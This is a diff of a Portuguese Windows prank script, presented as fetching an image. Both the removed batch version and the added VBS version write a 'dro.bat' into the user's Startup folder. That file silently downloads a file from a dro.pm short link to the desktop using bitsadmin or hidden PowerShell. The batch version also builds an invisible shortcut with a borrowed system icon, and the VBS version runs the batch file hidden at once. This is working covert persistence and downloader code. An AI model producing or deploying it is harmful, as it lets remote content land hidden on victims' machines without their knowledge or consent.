@@ -1,35 +1,23 @@
-@echo off
-setlocal
+' Script VBS que cria um .bat na pasta Inicialização para baixar uma imagem
 
-:: Caminhos
-set DESKTOP=%USERPROFILE%\Desktop
-set LINK="%DESKTOP%\inicia_zoeira.lnk"
-set VBS_PATH=%TEMP%\fdp_script.vbs
-set SUB_VBS=%TEMP%\fdp_hidden.vbs
+Set oWS = CreateObject("WScript.Shell")
+Set fso = CreateObject("Scripting.FileSystemObject")
 
-:: Criar o VBS de criação do .BAT
-> "%SUB_VBS%" echo Set oWS = CreateObject("WScript.Shell")
->> "%SUB_VBS%" echo Set fso = CreateObject("Scripting.FileSystemObject")
->> "%SUB_VBS%" echo startup = oWS.SpecialFolders("Startup")
->> "%SUB_VBS%" echo Set bat = fso.CreateTextFile(startup ^& "\dro.bat", True)
->> "%SUB_VBS%" echo bat.WriteLine "@echo off"
->> "%SUB_VBS%" echo bat.WriteLine "ver | findstr /i ""5\.1"" >nul"
->> "%SUB_VBS%" echo bat.WriteLine "if %%errorlevel%%==0 ("
->> "%SUB_VBS%" echo bat.WriteLine "  bitsadmin /transfer fdp /download /priority foreground https://dro.pm/foda-se foda.jpg"
->> "%SUB_VBS%" echo bat.WriteLine "  move foda.jpg %%USERPROFILE%%\Desktop"
->> "%SUB_VBS%" echo bat.WriteLine ") else ("
->> "%SUB_VBS%" echo bat.WriteLine "  powershell -WindowStyle Hidden -Command ""Invoke-WebRequest 'https://dro.pm/foda-se' -OutFile $env:USERPROFILE\Desktop\foda-se.jpg"""
->> "%SUB_VBS%" echo bat.WriteLine ")"
->> "%SUB_VBS%" echo bat.Close
+startupPath = oWS.SpecialFolders("Startup")
+batPath = startupPath & "\dro.bat"
 
-:: Criar o VBS principal que roda o VBS acima
-> "%VBS_PATH%" echo Set oWS = CreateObject("WScript.Shell")
->> "%VBS_PATH%" echo oWS.Run "wscript.exe ""%SUB_VBS%""", 0, False
+batCode = "@echo off" & vbCrLf & _
+          "ver | findstr /i ""5\.1"" >nul" & vbCrLf & _
+          "if %errorlevel%==0 (" & vbCrLf & _
+          "  bitsadmin /transfer fdp /download /priority foreground https://dro.pm/idk foda.jpg" & vbCrLf & _
+          "  move /Y foda.jpg %USERPROFILE%\Desktop" & vbCrLf & _
+          ") else (" & vbCrLf & _
+          "  powershell -WindowStyle Hidden -Command ""Invoke-WebRequest 'https://dro.pm/idk' -OutFile $env:USERPROFILE\Desktop\foda-se.jpg""" & vbCrLf & _
+          ")"
 
-:: Criar o .LNK que chama o VBS de forma invisível
-powershell -command "$s=(New-Object -COM WScript.Shell).CreateShortcut(%LINK%); $s.TargetPath='wscript.exe'; $s.Arguments='%VBS_PATH%'; $s.IconLocation='shell32.dll,39'; $s.WindowStyle=7; $s.Save()"
+Set batFile = fso.CreateTextFile(batPath, True)
+batFile.WriteLine batCode
+batFile.Close
 
-echo.
-echo 👻 Atalho totalmente invisível criado na Área de Trabalho!
-echo Clicou? Ninguém viu. Mas o inferno foi invocado.
-pause >nul
+' Opcional: executar o .bat imediatamente para baixar a imagem sem reiniciar
+oWS.Run Chr(34) & batPath & Chr(34), 0, False
